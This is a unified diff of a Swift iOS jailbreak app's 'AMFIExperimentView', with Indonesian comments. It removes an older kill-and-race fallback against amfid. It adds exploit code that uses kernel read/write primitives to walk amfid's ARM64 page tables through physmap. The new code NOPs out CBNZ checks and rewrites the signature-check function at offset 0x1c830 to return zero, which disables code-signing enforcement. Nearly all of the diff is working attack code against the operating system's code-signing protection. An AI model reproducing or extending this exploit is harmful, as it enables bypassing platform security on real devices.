@@ -7189,60 +7189,207 @@ struct AMFIExperimentView: View {
                 RootExecutor.rcall(rc, "free", mountTarget)
 
                 if mountRet != 0 {
-                    // Mount gagal — coba rename approach
+                    // Mount gagal — FALLBACK 3: Patch amfid IN-MEMORY via physmap
                     detail += "\n⚠️ Bind mount tidak tersedia di iOS 18.\n"
-                    detail += "Coba alternatif: rename + symlink...\n"
+                    detail += "=== Fallback 3: Patch amfid memory via physmap ===\n\n"
 
-                    // Tidak bisa rename di rootfs (read-only)
-                    // Tapi kita bisa coba posix_spawn dengan path ke patched binary
-                    detail += "\n=== Alternatif: Spawn langsung dari patched binary ===\n"
-                    detail += "Binary patched ada di: \(patchedPath)\n"
-                    detail += "Coba spawn binary unsigned dengan amfid yang masih original...\n"
-                    detail += "TAPI: kita bisa spawn PATCHED amfid sebagai pengganti!\n\n"
+                    // Kita tahu:
+                    // - amfid __TEXT runtime: dari vm_map walk (Step 2 Exp 84 sebelumnya)
+                    // - amfid pmap: dari vm_map+0x40
+                    // - Physical TTBR di pmap+0x08
+                    // - gVirtBase/gPhysBase dari Exp 74
+                    //
+                    // Flow: pmap+0x08 (physical TTBR) → physmap VA → walk L1→L2→L3
+                    //       → physical address amfid text → physmap VA → write NOP
 
-                    // Kill amfid lalu spawn patched version sebagai replacement
-                    detail += "Step D: Kill amfid + spawn patched version...\n"
-                    let killRet = RootExecutor.rcall(rc, "kill", UInt64(amfidPid), 9)
-                    detail += "kill(\(amfidPid)): ret=\(killRet)\n"
-
-                    // Spawn patched amfid (akan jalan sebagai PID baru)
-                    // amfid biasanya di-launch oleh launchd via plist
-                    // Kita tidak bisa replace launchd's spawn, tapi kita bisa:
-                    // 1. Tunggu launchd restart amfid (dari original)
-                    // 2. Segera setelah restart, coba spawn binary kita
-                    //    (ada window kecil di mana amfid belum fully initialized)
-
-                    RootExecutor.rcall(rc, "usleep", 500000) // 500ms
-
-                    // Coba spawn binary test SEKARANG (race window)
-                    let testBin = remote_alloc_str(rc, "/usr/bin/id")
-                    let argvBase = mem + 0x3000
-                    rc[argvBase].setValue64(testBin)
-                    rc[argvBase + 8].setValue64(0)
-                    let pidOut = mem + 0x3100
-                    rc[pidOut].setValue32(0)
-
-                    let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidOut, testBin, 0, 0, argvBase, 0)
-                    let spawnPid = rc[pidOut].value32()
-                    detail += "posix_spawn(/usr/bin/id): ret=\(spawnRet), pid=\(spawnPid)\n"
-
-                    RootExecutor.rcall(rc, "free", testBin)
-
-                    if spawnRet == 0 && spawnPid != 0 {
-                        // Wait for it
-                        let statusBuf = mem + 0x3200
-                        rc[statusBuf].setValue32(0)
-                        RootExecutor.rcall(rc, "waitpid", UInt64(spawnPid), statusBuf, 0)
-                        let status = rc[statusBuf].value32()
-                        let exitCode = (status >> 8) & 0xFF
-                        detail += "exit code: \(exitCode)\n"
-                        detail += "✅ Binary spawned during amfid restart window!\n"
+                    guard let physmap = PhysmapConstants.load() else {
+                        detail += "❌ Physmap constants tidak tersedia.\n"
+                        RootExecutor.rcall(rc, "free", amfidPath)
+                        RootExecutor.rcall(rc, "free", patchedPathAddr)
+                        return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
                     }
 
-                    detail += "\n=== INFO ===\n"
-                    detail += "Patched amfid binary tersimpan di: \(patchedPath)\n"
-                    detail += "Ukuran: \(totalCopied) bytes, \(bindPatched) instruksi di-NOP\n"
-                    detail += "Bind mount tidak tersedia — perlu approach lain untuk replace amfid.\n"
+                    let gVirtBase = physmap.gVirtBase
+                    let gPhysBase = physmap.gPhysBase
+
+                    // Re-read amfid pmap (fresh)
+                    let amfidVmMap2 = task_get_vm_map(ds_kread64(amfidProcRo != 0 ? amfidProcRo : ds_kread64(amfidProc + UInt64(off_proc_p_proc_ro)) + UInt64(off_proc_ro_pr_task) : 0))
+                    var amfidPmap2: UInt64 = 0
+                    let amfidProcRo2 = ds_kread64(amfidProc + UInt64(off_proc_p_proc_ro))
+                    let amfidTask2 = amfidProcRo2 != 0 ? ds_kread64(amfidProcRo2 + UInt64(off_proc_ro_pr_task)) : 0
+                    if amfidTask2 != 0 {
+                        let vm2 = task_get_vm_map(amfidTask2)
+                        if vm2 != 0 {
+                            for off: UInt64 in [0x40, 0x48, 0x50, 0x58, 0x38] {
+                                let c = ds_kreadptr(vm2 + off)
+                                if isLikelyKernelPointer(c) && pmapCandidateScore(c) >= 3 {
+                                    amfidPmap2 = c
+                                    break
+                                }
+                            }
+                        }
+                    }
+
+                    detail += "amfid pmap: 0x\(String(format: "%llx", amfidPmap2))\n"
+
+                    guard amfidPmap2 != 0 else {
+                        detail += "❌ amfid pmap tidak ditemukan.\n"
+                        RootExecutor.rcall(rc, "free", amfidPath)
+                        RootExecutor.rcall(rc, "free", patchedPathAddr)
+                        return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+                    }
+
+                    // Read physical TTBR dari pmap+0x08 (RAW, tanpa PAC strip)
+                    let physTTBR = ds_kread64_safe(amfidPmap2 + 8)
+                    detail += "Physical TTBR (pmap+0x08): 0x\(String(format: "%llx", physTTBR))\n"
+
+                    guard isReasonablePhysTT(physTTBR) else {
+                        detail += "❌ TTBR bukan physical address valid.\n"
+                        RootExecutor.rcall(rc, "free", amfidPath)
+                        RootExecutor.rcall(rc, "free", patchedPathAddr)
+                        return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+                    }
+
+                    // Convert TTBR physical → physmap VA
+                    let ttbrPhysmapVA = physTTBR &- gPhysBase &+ gVirtBase
+                    detail += "TTBR physmap VA: 0x\(String(format: "%llx", ttbrPhysmapVA))\n"
+
+                    guard isSafePhysmapKRWAddress(ttbrPhysmapVA) else {
+                        detail += "❌ TTBR physmap VA tidak aman.\n"
+                        RootExecutor.rcall(rc, "free", amfidPath)
+                        RootExecutor.rcall(rc, "free", patchedPathAddr)
+                        return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+                    }
+
+                    // amfid __TEXT runtime base dari vm_map walk sebelumnya
+                    // Hardcode dari Exp 84 hasil: 0x16cd60000
+                    // Tapi bisa berubah (ASLR) — pakai yang dari Step 2 foto: 0x16cd60000
+                    let amfidRuntimeText: UInt64 = 0x16cd60000
+
+                    // Page table walk: untuk setiap patch offset, resolve physical address
+                    detail += "\nPatching via physmap page table walk...\n"
+
+                    var physmapPatched = 0
+                    for (i, offset) in amfidTextOffsets.enumerated() {
+                        let targetVA = amfidRuntimeText + offset
+                        let l1Idx = (targetVA >> 36) & 0x7
+                        let l2Idx = (targetVA >> 25) & 0x7FF
+                        let l3Idx = (targetVA >> 14) & 0x7FF
+                        let pageOff = targetVA & 0x3FFF
+
+                        // L1: TTBR is the L1 table (or L2 for 3-level)
+                        // arm64 userspace with 16KB pages: might be 3-level (L1→L2→L3)
+                        // or 2-level (L2→L3) depending on VA size
+                        // amfid VA 0x16cd60000: bit[38:36]=0, bit[35:25]=0xB66, bit[24:14]=0x360
+
+                        // Try as L1 table first
+                        let l1Entry = ds_kread64_safe(ttbrPhysmapVA + l1Idx * 8)
+
+                        var l2PhysmapVA: UInt64 = 0
+                        if l1Entry & 0x3 == 0x3 {
+                            // Valid L1 table descriptor → points to L2
+                            let l2Phys = l1Entry & 0x0000FFFFFFFC0000
+                            l2PhysmapVA = l2Phys &- gPhysBase &+ gVirtBase
+                        } else {
+                            // Maybe TTBR IS the L2 table directly (2-level page table)
+                            l2PhysmapVA = ttbrPhysmapVA
+                        }
+
+                        guard isSafePhysmapKRWAddress(l2PhysmapVA) else { continue }
+
+                        let l2Entry = ds_kread64_safe(l2PhysmapVA + l2Idx * 8)
+                        guard l2Entry & 0x3 == 0x3 else { continue }
+
+                        let l3Phys = l2Entry & 0x0000FFFFFFFC0000
+                        let l3PhysmapVA = l3Phys &- gPhysBase &+ gVirtBase
+                        guard isSafePhysmapKRWAddress(l3PhysmapVA) else { continue }
+
+                        let l3Entry = ds_kread64_safe(l3PhysmapVA + l3Idx * 8)
+                        guard l3Entry & 0x1 == 0x1 else { continue }
+
+                        let pagePhys = l3Entry & 0x0000FFFFFFFC0000
+                        let instrPhysmapVA = (pagePhys &- gPhysBase &+ gVirtBase) + pageOff
+
+                        guard isSafePhysmapKRWAddress(instrPhysmapVA) else { continue }
+
+                        // Read original instruction
+                        let origInstr = ds_kread32(instrPhysmapVA)
+                        let isCBNZ = (origInstr >> 24) == 0x35 && (origInstr & 0x1F) == 0
+                        guard isCBNZ else {
+                            if i == 0 {
+                                detail += "  [\(i)] 0x\(String(format: "%08x", origInstr)) — bukan CBNZ (page table mungkin salah)\n"
+                            }
+                            continue
+                        }
+
+                        // WRITE NOP via physmap!
+                        ds_kwrite32(instrPhysmapVA, NOP)
+
+                        // Verify
+                        let afterInstr = ds_kread32(instrPhysmapVA)
+                        if afterInstr == NOP {
+                            physmapPatched += 1
+                            if physmapPatched <= 5 {
+                                detail += "  ✅ [\(i)] +0x\(String(format: "%x", offset)): NOP (via physmap)\n"
+                            }
+                        }
+                    }
+
+                    // Also patch signature check function (0x1c830)
+                    let sigOff: UInt64 = 0x1c830
+                    let sigVA = amfidRuntimeText + sigOff
+                    let sigL1Idx = (sigVA >> 36) & 0x7
+                    let sigL2Idx = (sigVA >> 25) & 0x7FF
+                    let sigL3Idx = (sigVA >> 14) & 0x7FF
+                    let sigPageOff = sigVA & 0x3FFF
+
+                    let sigL1 = ds_kread64_safe(ttbrPhysmapVA + sigL1Idx * 8)
+                    var sigL2VA: UInt64 = sigL1 & 0x3 == 0x3 ? ((sigL1 & 0x0000FFFFFFFC0000) &- gPhysBase &+ gVirtBase) : ttbrPhysmapVA
+                    if isSafePhysmapKRWAddress(sigL2VA) {
+                        let sigL2 = ds_kread64_safe(sigL2VA + sigL2Idx * 8)
+                        if sigL2 & 0x3 == 0x3 {
+                            let sigL3Phys = sigL2 & 0x0000FFFFFFFC0000
+                            let sigL3VA = sigL3Phys &- gPhysBase &+ gVirtBase
+                            if isSafePhysmapKRWAddress(sigL3VA) {
+                                let sigL3 = ds_kread64_safe(sigL3VA + sigL3Idx * 8)
+                                if sigL3 & 0x1 == 0x1 {
+                                    let sigPagePhys = sigL3 & 0x0000FFFFFFFC0000
+                                    let sigInstrVA = (sigPagePhys &- gPhysBase &+ gVirtBase) + sigPageOff
+                                    if isSafePhysmapKRWAddress(sigInstrVA) {
+                                        // Write MOV W0, #0 + RET
+                                        ds_kwrite32(sigInstrVA, 0x52800000)
+                                        ds_kwrite32(sigInstrVA + 4, 0xD65F03C0)
+                                        let v0 = ds_kread32(sigInstrVA)
+                                        let v1 = ds_kread32(sigInstrVA + 4)
+                                        if v0 == 0x52800000 && v1 == 0xD65F03C0 {
+                                            physmapPatched += 1
+                                            detail += "  ✅ +0x1c830: MOV W0,#0 + RET (via physmap)\n"
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+
+                    if physmapPatched > 5 {
+                        detail += "  ... dan \(physmapPatched - 5) lainnya\n"
+                    }
+                    detail += "\nPhysmap patched: \(physmapPatched)\n\n"
+
+                    if physmapPatched > 0 {
+                        detail += "🎉🎉🎉 amfid PATCHED VIA PHYSMAP! 🎉🎉🎉\n\n"
+                        detail += "amfid signature check di-NOP langsung di memory!\n"
+                        detail += "→ Tap ④ Test Binary Spawn untuk verifikasi!\n"
+                        detail += "→ Jika spawn berhasil = FULL JAILBREAK!\n\n"
+                        detail += "⚠️ Patch hilang jika amfid restart (KeepAlive).\n"
+                    } else {
+                        detail += "❌ Physmap patch juga gagal.\n"
+                        detail += "Page table walk tidak resolve ke physical address yang valid.\n"
+                        detail += "Atau: amfid text pages di-protect W^X di hardware level.\n\n"
+                        detail += "=== INFO ===\n"
+                        detail += "Patched binary tersimpan di: \(patchedPath)\n"
+                        detail += "\(bindPatched) instruksi di-NOP di file.\n"
+                    }
                 }
 
                 if mountRet == 0 {
